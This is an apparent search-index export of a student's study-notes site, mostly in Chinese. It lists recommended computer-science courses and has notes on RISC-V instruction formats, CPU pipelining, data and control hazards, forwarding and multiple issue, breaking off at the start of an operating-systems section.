<li>Lab \u73af\u5883\u642d\u5efa\u53ca Lab \u603b\u7ed3</li> <li>Lab \u8be6\u89e3</li> <li>\u5317\u5927\u7248 Lab \u8be6\u89e3</li> <li>\u6211\u6ca1\u505a HomeWork\uff0c\u4f46\u662f\u53ef\u4ee5\u53c2\u8003\u4e0b\u9762\u4e24\u4e2a\u9898\u89e3\uff1f<ul> <li>CSAPP-3e-Solutions</li> <li>csapp-3e-homework-solution</li> </ul> </li> </ul> </li> <li>Introduction to Generative AI 2024 Spring<ul> <li>Hung-yi Lee (\u674e\u5b8f\u6bc5) \u5728\u570b\u7acb\u81fa\u7063\u5927\u5b78\u5f00\u8bbe\u7684\u751f\u6210\u5f0f\u4eba\u5de5\u667a\u80fd\u5bfc\u8bba\u8bfe\uff1b</li> <li>\u8bfe\u7a0b\u672c\u8eab\u975e\u5e38\u6d45\u663e\u6613\u61c2\uff0c\u8ba9\u5b66\u751f\u8fc5\u901f\u7406\u89e3\u4e86\u4ec0\u4e48\u662f\u751f\u6210\u5f0f\u4eba\u5de5\u667a\u80fd\uff1b</li> <li>\u540c\u65f6\u8001\u5e08\u8bb2\u8bfe\u8bd9\u8c10\u6709\u8da3\uff0c\u4f1a\u5f15\u7528\u4e00\u4e9b\u70ed\u95e8\u52a8\u6f2b\u4e2d\u7684\u5267\u60c5\uff08\u8fd9\u91cc\u5f15\u7528\u6bd4\u8f83\u591a\u7684\u662f\u846c\u9001\u7684\u8299\u8389\u83b2\uff09\uff1b</li> <li>\u89c6\u9891\u653e\u5728\u4e86 youtube \u4e0a\uff0cbilibili \u4e0a\u4e5f\u6709\u642c\u8fd0\u3002</li> </ul> </li> </ul>","tags":["collection"]},{"location":"collection/teachyourselfcs/#iv","title":"IV \u5176\u4ed6","text":"<ul> <li>CIML(Course in Machine Learning)<ul> <li>\"CIML is a set of introductory materials that covers most major aspects of modern machine learning (supervised learning, unsupervised learning, large margin methods, probabilistic modeling, learning theory, etc.). It's focus is on broad applications with a rigorous backbone. A subset can be used for an undergraduate course; a graduate course could probably cover the entire material and then some.\"</li> <li>\u8fd9\u91cc\u4e0b\u8f7dpdf</li> </ul> </li> <li>Dive into Deep Learning<ul> <li>\u52a8\u624b\u5b66\u6df1\u5ea6\u5b66\u4e60</li> <li>\u4e60\u9898\u89e3\u7b54</li> </ul> </li> <li>Awesome-CS-Course-Learning-Notes</li> <li>learn x in y minutes</li> <li>codethechange.stanford.edu<ul> <li>\u4e5f\u8bb8\u6709\u4e9b\u5947\u602a\u7684\u4e1c\u897f\u4f60\u4e0d\u77e5\u9053\uff0c\u4f46\u662f\u53ef\u80fd\u611f\u5174\u8da3\u3002</li> </ul> </li> <li>\u6570\u7406\u767e\u79d1</li> <li>\u6570\u6a21\u767e\u79d1</li> </ul>","tags":["collection"]},{"location":"note/","title":"Note","text":""},{"location":"note/#_1","title":"\u4ecb\u7ecd","text":"<p>\u8fd9\u91cc\u662f\u8bfe\u5185/\u5916\u8bfe\u7a0b\u7684\u5b66\u4e60\u7b14\u8bb0\uff08\u5bf9\u4e8e\u76f8\u5bf9\u66f4\u52a0\u9f50\u5168\u7684\u8bfe\u5185\u7b14\u8bb0\uff0c\u53c2\u89c1 note_link\uff09\u3002\u7531\u4e8e\u539f\u672c\u5728 obsidian \u4e0a\u8bb0\u5f55\uff0c\u90e8\u5206\u6548\u679c\u65e0\u6cd5\u5728\u7f51\u7ad9\u4e0a\u5c55\u793a\u51fa\u6765<sup>1</sup>\uff0c\u6545\u9664\u4e86\u5728\u672c\u7ad9\u9605\u8bfb\u5916\uff0c\u8fd9\u91cc\u63d0\u4f9b\u4e86\u4e09\u4e2a\u65b9\u6848\u83b7\u53d6\u66f4\u597d\u7684\u9605\u8bfb\u4f53\u9a8c\uff1a (\u5df2\u5b8c\u5584 Mkdocs \u7b14\u8bb0)\u3002</p> <ul> <li>\u4f7f\u7528 Obsidian \u9605\u8bfb\uff08\u63a8\u8350\uff09<ul> <li>\u5728 Github \u4e2d\u53ef\u83b7\u53d6\u7b14\u8bb0 markdown \u6e90\u6587\u4ef6\uff0c\u5b9e\u65f6\u66f4\u65b0\uff1b</li> <li>\u4e0b\u8f7d\u53ef\u4f7f\u7528DownGit</li> </ul> </li> <li>\u83b7\u53d6 pdf \u7248<ul> <li>\u5728 Github \u5bf9\u5e94\u7b14\u8bb0\u7684\u6587\u4ef6\u5939\u4e2d \u53ef\u80fd<sup>2</sup> \u6709\u4e00\u4e2a\u6587\u4ef6\u5939 <code>&lt;note_name&gt;-pdf</code>\uff0c\u662f\u6211\u5bfc\u51fa\u7684 pdf \u6587\u4ef6\uff0c\u5b8c\u6210\u4e00\u4e2a\u8bfe\u7a0b\u540e\u66f4\u65b0\uff0c\u4f7f\u7528\u8f83\u591a\u7684\u7b14\u8bb0\u4fee\u6539\u540e\u4f1a\u66f4\u65b0\uff1b</li> </ul> </li> <li>\u67e5\u770b notebook<ul> <li>\u5899\u5916\uff0c\u5b8c\u6210\u4e00\u4e2a\u8bfe\u7a0b\u540e\u66f4\u65b0\uff0c\u4e4b\u540e\u7684\u4fee\u6539\u53ef\u80fd\u4e0d\u4f1a\u66f4\u65b0\uff1b</li> <li>\u4f7f\u7528 Obsidian Digital Garden \u501f\u52a9 vercel \u642d\u5efa\u3002</li> </ul> </li> </ul>"},{"location":"note/#_2","title":"\u76ee\u5f55","text":"cs188          <ul> <li> note  18270  243  64 mins              1740028248 </li> <li> project  3672  898  24 mins              1739718485 </li> </ul> physics          <ul> <li> physics1-problems  901  3 mins              1739718485 </li> <li> physics2-problems  4309  25  15 mins              1739636325 </li> <li> \u5927\u7269\u5b9e\u9a8c\u7eea\u8bba\u8bfe\u4f5c\u4e1a  1249  4 mins              1739448123 </li> <li> \u5927\u7269\u5b9e\u9a8c\u6570\u636e\u5904\u7406\u811a\u672c  361  291  5 mins              1739448123 </li> </ul> CSys-II          <ul> <li> 1_pipeline  1646  5  6 mins              1740028248 </li> <li> 6_Synchronization  2019  232  10 mins              1739674879 </li> <li> 2_OS  1326  13  5 mins              1739636325 </li> <li> 3_Process  1357  68  5 mins              1739636325 </li> <li> 4_Scheduling  609  2 mins              1739636325 </li> <li> 5_IPC  967  3 mins              1739624158 </li> </ul> cs70          <ul> <li> 02-Proof  1284  4 mins              1739753830 </li> <li> 01-Propositional_Logic  799  3 mins              1739718485 </li> <li> 03-Mathematical_Induction  1278  4 mins              1739718485 </li> <li> 04-The_Stable_Matching_Problem  1542  5 mins              1739718485 </li> <li> 05-Graph_Theory  4767  13  16 mins              1739718485 </li> </ul> <ol> <li> <p>obsidian \u5012\u662f\u652f\u6301 publish\uff0c8$/month\uff0c\u7528\u4e0d\u8d77\u2026\u2026\u00a0\u21a9</p> </li> <li> <p>\u6709\u65f6\u6ca1\u6765\u5f97\u53ca\u53ca\u6216\u8005\u5fd8\u8bb0\u4e86\u2026\u2026\u00a0\u21a9</p> </li> </ol>"},{"location":"note/CSys-II/","title":"Index","text":"<p>\u6d59\u6c5f\u5927\u5b66\u672c\u79d1\u8d2f\u901a\u8bfe\u7a0b\u8ba1\u7b97\u673a\u7cfb\u7edf II \u8bfe\u7a0b\u7b14\u8bb0\uff1b\u6ce8\u610f\uff0c\u7b14\u8bb0\u4e0d\u9002\u5408\u6ca1\u6709\u7b2c\u4e00\u6b21\u5b66\u4e60\uff0c\u4e3b\u8981\u5e94\u8be5\u7528\u4e8e\u671f\u672b\u590d\u4e60\u4e0e\u5de9\u56fa\u3002</p> computer system II          <ul> <li> 1_pipeline  1646  5  6 mins              1740028248 </li> <li> 6_Synchronization  2019  232  10 mins              1739674879 </li> <li> 2_OS  1326  13  5 mins              1739636325 </li> <li> 3_Process  1357  68  5 mins              1739636325 </li> <li> 4_Scheduling  609  2 mins              1739636325 </li> <li> 5_IPC  967  3 mins              1739624158 </li> </ul> <ul> <li>sysII cheatpapaer1 &amp; sysII cheatpaper2</li> </ul>","tags":["notes"]},{"location":"note/CSys-II/1_pipeline/","title":"1 pipeline","text":"","tags":["notes"]},{"location":"note/CSys-II/1_pipeline/#isa-review","title":"ISA review","text":"","tags":["notes"]},{"location":"note/CSys-II/1_pipeline/#instruction-set-principles","title":"Instruction Set Principles","text":"<ul> <li>type of internal storage:<ul> <li>stack</li> <li>accumulator</li> <li>register</li> </ul> </li> </ul> <p>GPR: General Purpose Register TOS: Top Of Stack</p> <p></p> <p>Risc-V (RR): -  To apply arithmetic operations     - Load values from memory into registers     - Store result from register to memory - Memory is byte addressed     - Each address identifies an 8-bit byte - Words are aligned in memory     - Address must be a multiple of 4 - RISC-V is Little Endian     - Least-significant byte at least address</p> <ul> <li>RISC-V ISA designed for pipelining<ul> <li>All instructions are 32-bits<ul> <li>Easier to fetch and decode in one cycle</li> <li>c.f. x86: 1- to 17-byte instructions</li> </ul> </li> <li>Few and regular instruction formats<ul> <li>Can decode and read registers in one step</li> </ul> </li> <li>Load/store addressing<ul> <li>Can calculate address in 3rd stage, access memory in 4th stage</li> </ul> </li> <li>Alignment of memory operands<ul> <li>Memory access takes only one cycle</li> </ul> </li> </ul> </li> </ul>","tags":["notes"]},{"location":"note/CSys-II/1_pipeline/#format-of-instructions","title":"Format of instructions","text":"<ul> <li>Six Basic Instruction formats (similar to MIPS, but optimized)<ul> <li>Reduce combinational logic delay</li> <li>Extend addressing range</li> </ul> </li> </ul> <p>No subtract immediate instruction,Just use a negative constant  - addi x8, x9, -1</p>","tags":["notes"]},{"location":"note/CSys-II/1_pipeline/#address-mode","title":"Address mode","text":"<ul> <li>immediate addressing</li> <li>register addressing</li> <li>base addressing</li> <li>PC-relative addressing</li> </ul>","tags":["notes"]},{"location":"note/CSys-II/1_pipeline/#classes-of-pipelining","title":"Classes of pipelining","text":"<ul> <li>The pipelining needs the pass time and the empty time<ul> <li>Pass time: the time for the first task from beginning (entering the pipelining) to ending.</li> <li>Empty time: the time for the last task from entering the pipelining to have the result.</li> </ul> </li> </ul>","tags":["notes"]},{"location":"note/CSys-II/1_pipeline/#single-multi","title":"single &amp; multi","text":"<ul> <li>Single function pipelining<ul> <li>only one fixed function pipelining (just like five-stages pipeline we will learn)</li> </ul> </li> <li>Multi function pipelining<ul> <li>each section of the pipelining can be connected differently for several different functions.</li> </ul> </li> </ul> \u4e0d\u540c\u8fde\u63a5\u5b9e\u73b0\u4e0d\u540c\u7684\u529f\u80fd","tags":["notes"]},{"location":"note/CSys-II/1_pipeline/#static-dynamic","title":"static &amp; dynamic","text":"<ul> <li>Static pipelining<ul> <li>In the same time, each segment of the multi- functional pipelining can only work according to the connection mode of the same function</li> <li>\u4e5f\u5c31\u662f\u8bf4\uff0c\u53ea\u6709\u8fd9\u4e00\u529f\u80fd\u5b9e\u73b0\u5b8c\u6bd5\u540e\u624d\u80fd\u591f\u5207\u6362\uff1b\u8003\u8651\u6d41\u6c34\u7ebf\u5145\u6ee1\u548c\u6392\u7a7a\u7684\u65f6\u95f4\uff0c\u5982\u679c\u53cd\u590d\u5207\u6362\u529f\u80fd\uff0c\u6548\u7387\u975e\u5e38\u4f4e\u3002</li> </ul> </li> <li>Dynamic pipelining<ul> <li>In the same time, each segment of the multi- functional pipelining can be connected in different ways and perform multiple functions at the same time</li> </ul> </li> </ul>","tags":["notes"]},{"location":"note/CSys-II/1_pipeline/#linear-nonlinear","title":"linear &amp; nonlinear","text":"<ul> <li>Linear pipelining<ul> <li>Each stage of the pipelining is connected serially without feedback loop. When data passes through each segment in the pipelining, each segment can only flow once at most.</li> </ul> </li> <li>Nonlinear pipelining<ul> <li>In addition to the serial connection, there is also a feedback loop in the pipelining</li> <li>Initial conflit vector -&gt; conflict vector -&gt; state transition graph -&gt; circular queue -&gt; shortest average interval</li> </ul> </li> </ul> <p>\u5173\u4e8e\u505a\u9898\uff0c\u653e\u5728 PBFX - Linear and nonlinear pipeline</p>","tags":["notes"]},{"location":"note/CSys-II/1_pipeline/#order-disorder","title":"order &amp; disorder","text":"<ul> <li>Ordered pipelining<ul> <li>In the pipelining, the outflow order of tasks is exactly the same as the inflow order. Each task flows by sequence in each segment of the pipelining</li> </ul> </li> <li>Disordered pipelining<ul> <li>In the pipelining, the outflow order of tasks is not the same as the inflow order. The later tasks are allowed completed first</li> </ul> </li> </ul>","tags":["notes"]},{"location":"note/CSys-II/1_pipeline/#an-implementation-of-pipelining","title":"An Implementation of Pipelining","text":"<p>\u5355\u7eaf\u4ece\u7406\u89e3\u6d41\u6c34\u7ebf\u6765\u770b\uff0c\u6211\u4eec\u7684\u6d41\u6c34\u7ebf CPU \u5e94\u8be5\u662f\uff1a</p> <p></p>","tags":["notes"]},{"location":"note/CSys-II/1_pipeline/#single-cycle-datapath-to-the-pipelined-version","title":"Single-Cycle Datapath to the Pipelined Version","text":"<p>\u4ece\u5355\u5468\u671f CPU \u7684\u67b6\u6784\uff0c\u8bd5\u56fe\u5c06\u591a\u6761\u6307\u4ee4\u5206\u9636\u6bb5\u8fdb\u884c\u201c\u5e76\u884c\u201d\uff1a</p> <p></p> <p>Help</p> <p>\u4e0a\u56fe\u4e2d\uff0c\u6a2a\u8f74\u8868\u793a\u65f6\u949f\u5468\u671f\uff0c\u7eb5\u8f74\u4f9d\u6b21\u8868\u793a\u4e0b\u4e00\u6761\u6307\u4ee4\u3002</p> <p>\u53f3\u534a\u90e8\u5206\u7070\u8272\u8868\u793a\u5c06\u8981\u5411\u8be5\u90e8\u4ef6\u8fdb\u884c\u8bfb\u53d6\uff0c\u5de6\u534a\u90e8\u5206\u7070\u8272\u8868\u793a\u5c06\u8981\u5411\u8be5\u90e8\u4ef6\u5199\u5165\u3002</p> <p>\u6211\u4eec\u53d1\u73b0\u5982\u679c\u6211\u4eec\u60f3\u8981\u5e76\u884c\u591a\u6761\u6307\u4ee4\u7684\u6267\u884c\uff0c\u9700\u8981\u4e3a\u6bcf\u4e2a\u5e76\u884c\u6307\u4ee4\u8bbe\u7f6e\u4e00\u6761\u6570\u636e\u901a\u8def\uff1b\u4f46\u662f\u5f88\u591a\u65f6\u5019\u4e00\u4e9b\u90e8\u4ef6\u662f\u7a7a\u95f2\u7684\uff0c\u6211\u4eec\u60f3\u8981\u4f7f\u5f97\u5404\u90e8\u5206\u90e8\u4ef6\u80fd\u591f\u540c\u65f6\u5904\u7406\u4e0d\u540c\u6307\u4ee4\u7684\u5bf9\u5e94\u9636\u6bb5\uff0c\u63d0\u9ad8\u5229\u7528\u7387\u3002</p> <p>\u4f46\u662f\u5bf9\u4e8e\u540c\u4e00\u4e2a\u90e8\u4ef6\uff08\u4f8b\u5982\u5bc4\u5b58\u5668\uff09\uff0c\u540c\u65f6\u5199\u5165\u548c\u53d6\u51fa\u53ef\u80fd\u4f1a\u53d1\u751f\u9519\u8bef\uff1b\u540c\u65f6\u6211\u4eec\u9700\u8981\u540c\u65f6\u5b58\u50a8 5 \u6761\u6307\u4ee4\u6240\u9700\u8981\u7684\u5185\u5bb9\uff08\u4f8b\u5982\u5199\u5165\u5bc4\u5b58\u5668\u7684\u5730\u5740\u3001\u63a7\u5236\u4fe1\u53f7\uff09\uff0c\u6211\u4eec\u4f7f\u7528 pipeline registers \u6765\u4fdd\u7559\u5b83\u4eec\uff1a</p> <p></p> <p>\u5728\u6570\u636e\u901a\u8def\u4e0a\u8868\u73b0\u5982\u4e0b\uff1a</p> <p></p> <p>Note</p> <p>\u4e0a\u9762\u7684 datapath \u5728\u6267\u884c\u4e00\u4e9b\u6307\u4ee4\u7684\u65f6\u5019\u8fd8\u662f\u6709\u53ef\u80fd\u5b58\u5728\u95ee\u9898\u7684\uff1b\u4f8b\u5982\uff0c\u5728\u4e00\u4e2a ld \u6307\u4ee4\u4e2d\uff0c\u6211\u4eec\u4ece inst \u4e2d\u83b7\u53d6\u4e86 WB \u7684\u76ee\u6807\u5bc4\u5b58\u5668\uff0c\u4f46\u662f\u5728\u4e0a\u56fe\u4e2d\u4e22\u5931\u4e86\uff0c\u6211\u4eec\u53ef\u80fd\u9700\u8981\u5c06\u8fd9\u4e2a\u5bc4\u5b58\u5668\u5730\u5740\u4e0d\u65ad\u5411\u540e\u4f20\uff1a</p> <p></p> <p>\u5f53\u7136\uff0c\u9488\u5bf9\u4e0d\u540c\u7684\u6307\u4ee4\u6211\u4eec\u5bf9\u4e8e\u5728 datapath \u4e0a\u53ef\u80fd\u201c\u8d70\u5411\u4e0d\u540c\u7684\u5206\u8def\u201d\uff0c\u8fd9\u5c31\u9700\u8981\u63a7\u5236\u4fe1\u53f7\uff0c\u4f2a\u4ee3\u7801\u5982\u4e0b\uff1a</p> <p></p>","tags":["notes"]},{"location":"note/CSys-II/1_pipeline/#understand-pipelined-control-signals","title":"Understand Pipelined Control Signals","text":"<p>\u4ee5\u4e0b\u9762\u7684\u6307\u4ee4\u4e3a\u4f8b\uff1a</p> demo.asm<pre><code>ld x10, 40(x1)\nsub x11, x2, x3\nadd x12, x3, x4\nld x13, 48(x1)\nadd x14, x5, x6\n</code></pre> <p>\u9996\u5148\u770b\u770b\u5e38\u89c1\u7684\u6d41\u6c34\u7ebf\u56fe\u7684\u8868\u793a\u5f62\u5f0f\uff1a</p> Multiple-Clock-Cycle Pipeline Diagram of Five Instructions <p></p> Traditional Multiple-Clock-Cycle Pipeline Diagram <p></p> Single-Clock-Cycle Pipeline Diagram <p></p>","tags":["notes"]},{"location":"note/CSys-II/1_pipeline/#review-of-control-lines","title":"Review of control lines","text":"<p>\u4e0a\u56fe\u8868\u793a\uff0c\u5728 ID \u9636\u6bb5\u6211\u4eec\u901a\u8fc7\u89e3\u7801\u6307\u4ee4\u83b7\u53d6 7 \u6761\u63a7\u5236\u4fe1\u53f7\uff0c\u4e24\u6761\u7528\u4e8e EX \u9636\u6bb5\u3001\u4e09\u6761\u7528\u4e8e MEM \u9636\u6bb5\u3001\u4e24\u6761\u7528\u4e8e WB \u9636\u6bb5\u3002</p> <p>\u6700\u7ec8\u5f62\u6210\u7684 Pipelined Datapath with the Control Signals</p> <p></p>","tags":["notes"]},{"location":"note/CSys-II/1_pipeline/#performance-evaluation-of-pipelining","title":"Performance evaluation of Pipelining","text":"","tags":["notes"]},{"location":"note/CSys-II/1_pipeline/#throughput-tp","title":"Throughput (TP)","text":"<p>\u6ce8\u610f\u5355\u4f4d\u662f \\((n/p/m)s^{-1}\\) \u3002</p> <p>\u5b9e\u9645\u4e0a\u5404\u9636\u6bb5\u7684\u7528\u65f6\u5e76\u4e0d\u76f8\u540c\uff0c\u7528\u65f6\u6700\u957f\u7684\u4e3a\u74f6\u9888\u9636\u6bb5\uff0c\u5176\u7528\u65f6\u4e3a\uff1a \\(\\Delta t_{0} = max(\\Delta t_{1}, \\Delta t_{2} \\dots, \\Delta t_{m})\\) \u3002</p> <p>\u4f18\u5316\u6d41\u6c34\u7ebf\u74f6\u9888\u9636\u6bb5</p> <ul> <li>\u5c06\u74f6\u9888\u9636\u6bb5\u8fdb\u4e00\u6b65\u7ec6\u5206\u4e3a\u53ef\u4ee5\u6d41\u6c34\u7ebf\u64cd\u4f5c\u7684\u66f4\u5c0f\u9636\u6bb5 (Subdivision)\uff1b</li> <li>\u91cd\u53e0\u6267\u884c\u4e0d\u540c\u6307\u4ee4\u7684\u74f6\u9888\u9636\u6bb5 (Repetition)</li> </ul>","tags":["notes"]},{"location":"note/CSys-II/1_pipeline/#speedup-sp","title":"Speedup (Sp)","text":"<p>\u6ce8\u610f\u6ca1\u6709\u5355\u4f4d\u3002</p>","tags":["notes"]},{"location":"note/CSys-II/1_pipeline/#efficiency","title":"Efficiency (\u03b7)","text":"<p>\u6ce8\u610f\u7ed3\u679c\u4fdd\u7559\u767e\u5206\u6570\u3002</p> <p>How Pipelining Improves Performance?</p> <ul> <li> Decreasing the execution time of an individual instruction \u00d7</li> <li> Increasing instruction throughput</li> </ul>","tags":["notes"]},{"location":"note/CSys-II/1_pipeline/#hazard","title":"Hazard","text":"","tags":["notes"]},{"location":"note/CSys-II/1_pipeline/#structal-hazards","title":"Structal Hazards","text":"<p>A required resource is busy -&gt; Use Instruction and data memory simultaneously.</p> <p></p> <ul> <li>Problem: Two or more instructions in the pipeline compete for access to a single physical resource</li> <li>Solution<ul> <li>Instructions take it in turns to use resource, some instructions have to stall</li> <li>Add more hardware to machine (Can always solve a structural hazard by adding more hardware)</li> </ul> </li> </ul>","tags":["notes"]},{"location":"note/CSys-II/1_pipeline/#data-hazards-important-in-sysii","title":"Data Hazards (important in sysII)","text":"<p>Data Hazards</p> <p>Data dependency between instructions, need to wait for previous instruction to complete its data read/write  -&gt; Instruction depends on result from previous.</p> <p></p> <ul> <li>Problem: Instruction depends on result from previous.</li> </ul>","tags":["notes"]},{"location":"note/CSys-II/1_pipeline/#solution-1-stall","title":"Solution 1: \"Stall\"","text":"<p>Wait for several cycles.</p> <p>How to stall?</p> <p>NOP instruction: <code>addi x0, x0, 0</code></p> <p>or <p></p></p>","tags":["notes"]},{"location":"note/CSys-II/1_pipeline/#solution-2-forwarding","title":"Solution 2: \u201cforwarding\u201d","text":"<p>Adding extra hardware to retrieve the missing item early from the internal resources.</p>","tags":["notes"]},{"location":"note/CSys-II/1_pipeline/#ex-hazard","title":"EX hazard","text":"<ul> <li>if (EX/MEM.RegWrite and (EX/MEM.RegisterRd \u2260 0) and (EX/MEM.RegisterRd = ID/EX.RegisterRs1)) <ul> <li>ForwardA = 10</li> </ul> </li> <li>if (EX/MEM.RegWrite and (EX/MEM.RegisterRd \u2260 0) and (EX/MEM.RegisterRd = ID/EX.RegisterRs2)) <ul> <li>ForwardB = 10</li> </ul> </li> </ul>","tags":["notes"]},{"location":"note/CSys-II/1_pipeline/#mem-hazard","title":"MEM hazard","text":"<ul> <li>if (MEM/WB.RegWrite and (MEM/WB.RegisterRd \u2260 0) and (MEM/WB.RegisterRd = ID/EX.RegisterRs1)) <ul> <li>ForwardA = 01</li> </ul> </li> <li>if (MEM/WB.RegWrite and (MEM/WB.RegisterRd \u2260 0) and (MEM/WB.RegisterRd = ID/EX.RegisterRs2)) <ul> <li>ForwardB = 01</li> </ul> </li> </ul>","tags":["notes"]},{"location":"note/CSys-II/1_pipeline/#double-data-hazard","title":"Double Data Hazard","text":"<p>\u4f5c\u4e3a\u7279\u6b8a\u7684 MEM hazards \u5904\u7406\u3002</p>","tags":["notes"]},{"location":"note/CSys-II/1_pipeline/#forwarding-conditions","title":"Forwarding Conditions","text":"<p>Detecting the Need to Forward:</p> <p></p> <p></p> \u7531\u4e8e\u4e00\u4e9b\u9650\u5236\uff0c\u6211\u4eec\u5b9e\u73b0\u7684\u7248\u672c\u662f <p></p> When can we forward? <p>\u5728 Multiple-Clock-Cycle Pipeline Diagram of Five Instructions \u4e2d\u8868\u73b0\u4e3a\uff1a\u53ef\u4ee5\u5411\u5de6\u4e0b\u65b9\u4f20\u9012\uff0c\u4f46\u662f\u4e0d\u80fd\u5411\u53f3\u4e0b\u65b9\u4f20\u9012\uff08\u5982 load-use data hazard\uff09\u3002</p> <p></p> <p></p>","tags":["notes"]},{"location":"note/CSys-II/1_pipeline/#solution-3-double-bubble","title":"Solution 3: \"Double bubble\"","text":"","tags":["notes"]},{"location":"note/CSys-II/1_pipeline/#control-hazards","title":"Control Hazards (\u671f\u672b\u4e0d\u7528\u592a\u7ba1)","text":"<p>Flow of execution depends on previous instruction.</p>","tags":["notes"]},{"location":"note/CSys-II/1_pipeline/#solution-1-stall_1","title":"Solution 1: \"Stall\"","text":"<p>\u7b49\u5f85\uff0c\u76f4\u5230\u63a7\u5236\u6307\u4ee4\u8ba1\u7b97\u5b8c\u6210\u3002</p>","tags":["notes"]},{"location":"note/CSys-II/1_pipeline/#solution-2-prediction","title":"Solution 2: \"Prediction\"","text":"<p>\u9884\u6d4b\u5206\u652f\u7684\u8df3\u8f6c\u60c5\u51b5\uff1a - \u7b80\u5355\uff1a\u603b\u662f\u8ba4\u4e3a\uff08\u4e0d\uff09\u53d1\u751f\u8df3\u8f6c\uff1b - \u590d\u6742\uff1a\u5206\u6790\uff0c\u5982\u679c\u662f\u5f80\u4f4e\u5730\u5740\uff0c\u5927\u6982\u7387\u9700\u8981\u8df3\u8f6c\uff1b - \u52a8\u6001\uff1a\u8bb0\u5f55\u5386\u53f2\u8df3\u8f6c\u60c5\u51b5\u3002</p>","tags":["notes"]},{"location":"note/CSys-II/1_pipeline/#solution-3-delayed-decision","title":"Solution 3: \"Delayed Decision\"","text":"<p>\u5c06\u00a0branch\u00a0\u524d\u7684\u65e0\u5173\u6307\u4ee4\u79fb\u52a8\u5230\u00a0branch\u00a0\u4e4b\u540e\u7684\u00a0bubble\u00a0\u5904\uff08\u5206\u652f\u5ef6\u8fdf\u69fd\uff09\u6267\u884c\uff0c\u51cf\u5c11\u4e3a\u4e86\u7b49\u5f85\u800c\u63d2\u5165\u7684\u65e0\u610f\u4e49\u00a0bubble\u00a0\u4ee3\u7801</p> <p>pbfx - control hazards</p>","tags":["notes"]},{"location":"note/CSys-II/1_pipeline/#multiple-issue","title":"Multiple Issue","text":"<p>ILP: Instruction-Level Parallelism.</p> <ul> <li>Pipelining: executing multiple instructions in parallel. To increase ILP<ul> <li>Deeper pipeline<ul> <li>the number of segment in a pipelining is called the depth of the pipeline.</li> <li>Less work per stage -&gt; shorter clock cycle</li> </ul> </li> <li>Multiple issue<ul> <li>Replicate pipeline stages -&gt; multiple pipelines</li> <li>Start multiple instructions per clock cycle</li> <li>CPI &lt; 1, so use Instructions Per Cycle (IPC)<ul> <li>E.g., 4GHz 4-way multiple-issue</li> <li>16 BIPS, peak CPI = 0.25, peak IPC = 4</li> </ul> </li> </ul> </li> <li>But dependencies reduce this in practice</li> </ul> </li> </ul> <p>Comparison of the spatiotemporal diagrams (\u65f6\u7a7a\u56fe) of instructions executed by single-issue and multiple-issue processors\u3002</p> <p></p>","tags":["notes"]},{"location":"note/CSys-II/1_pipeline/#two-types-of-multiple-issue","title":"Two types of multiple-issue","text":"<ul> <li>Static multiple issue<ul> <li>Compiler groups instructions to be issued together<ul> <li>it must remove some/all hazards</li> </ul> </li> <li>Packages them into \u201cissue slots\u201d<ul> <li>no dependencies with a packet</li> </ul> </li> <li>Compiler detects and avoids hazards<ul> <li>pad with NOP if necessary</li> </ul> </li> </ul> </li> <li>Dynamic multiple issue<ul> <li>CPU examines instruction stream and chooses instructions to issue each cycle<ul> <li>avoiding structal and data hazards</li> </ul> </li> <li>Avoids the need for compiler scheduling<ul> <li>Compiler can help by reordering instructions</li> </ul> </li> <li>CPU resolves hazards using advanced techniques at runtime (Speculation, i.e. Guess)<ul> <li>allow cpu to execute instructions out of order to avoid stalls</li> <li>but commit result to register in order</li> </ul> </li> <li>why not just let the compiler schedule code ?<ul> <li>not all stalls are predicable</li> <li>can't always schedule around branches</li> <li>Different ISA implementation</li> </ul> </li> </ul> </li> <li>But Multiple Issue not works as much as we\u2019d like:<ul> <li>Programs have real dependencies that limit ILP</li> <li>Some dependencies are hard to eliminate<ul> <li>e.g., pointer aliasing</li> </ul> </li> <li>Some parallelism is hard to expose<ul> <li>Limited window size during instruction issue</li> </ul> </li> <li>Memory delays and limited bandwidth</li> <li>Hard to keep pipelines full</li> </ul> </li> </ul>","tags":["notes"]},{"location":"note/CSys-II/1_pipeline/#two-types-of-multiple-issue-processor","title":"Two types of multiple-issue processor","text":"<ul> <li>Superscalar<ul> <li>The number of instructions which are issued in each clock cycle is not fixed. It depends on the specific circumstances of the code. (1-8, with upper limit)</li> <li>Suppose this upper limit is n, then the processor is called n-issue.</li> <li>It can be statically scheduled through the compiler, or dynamically scheduled based on Tomasulo algorithm.</li> <li>This method is the most successful method for general computing at present.</li> </ul> </li> <li>VLIW (Very Long Instruction Word)<ul> <li>The number of instructions which are issued in each clock cycle is fixed (4-16), and these instructions constitute a long instruction or an instruction packet </li> <li>In the instruction packet, the parallelism between instructions is explicitly expressed through instructions</li> <li>Instruction scheduling is done statically by the compiler</li> <li>It has been successfully applied to digital signal processing and multimedia applications</li> </ul> </li> </ul>","tags":["notes"]},{"location":"note/CSys-II/1_pipeline/#super-pipeline","title":"Super-Pipeline","text":"<ul> <li>Each pipeline stage is further subdivided (like deeper pipeline)</li> <li>Multiple instructions can be time-shared in one clock cycle</li> </ul> <p>For a super-pipelined computer that can flow out n instructions per clock cycle, these n instructions are not flowed out at the same time, but one instruction is flowed out every 1/n clock cycle.</p> <p></p>","tags":["notes"]},{"location":"note/CSys-II/2_OS/","title":"2 OS","text":"","tags":["notes"]},{"location":"note/CSys-II/2_OS/#introduction","title":"Introduction","text":"","tags":["notes"]},{"location":"note/CSys-II/2_OS/#compiler-basics-behind-gcc-mainc","title":"Compiler basics - Behind gcc main.c","text":"<p>CRT: C runtime (Startup routines before main function)</p>","tags":["notes"]},{"location":"note/CSys-II/2_OS/#elf-binary-basics","title":"ELF binary basics","text":"<p>\u5185\u5b58\u4e2d\u4e0d\u4f1a\u5b58\u50a8\u6570\u636e\u7684\u201c\u7c7b\u578b\u201d\uff0c\u53ea\u5b58\u50a8 bytes\u3002</p>","tags":["notes"]},{"location":"note/CSys-II/2_OS/#running-a-binary-behind-aout","title":"Running a binary - Behind ./a.out","text":"","tags":["notes"]},{"location":"note/CSys-II/2_OS/#overview","title":"Overview","text":"","tags":["notes"]},{"location":"note/CSys-II/2_OS/#what-is-an-os","title":"What is an OS?","text":"<p>Question</p> <p>What is an OS?</p> <ul> <li>software layer between the applications and the hardware because the hardware would be too difficult for users to use .<ul> <li>Or: it\u2019s \u201call the code you didn\u2019t have to write\u201d when you wrote your application</li> </ul> </li> <li>It\u2019s a resource abstractor and a resource allocator (this one)<ul> <li>The OS defines a set of logical resources that correspond to hardware resources, and a set of well-defined operations on logical resources<ul> <li>e.g., physical resources: CPU, Disks, RAM</li> <li>e.g., 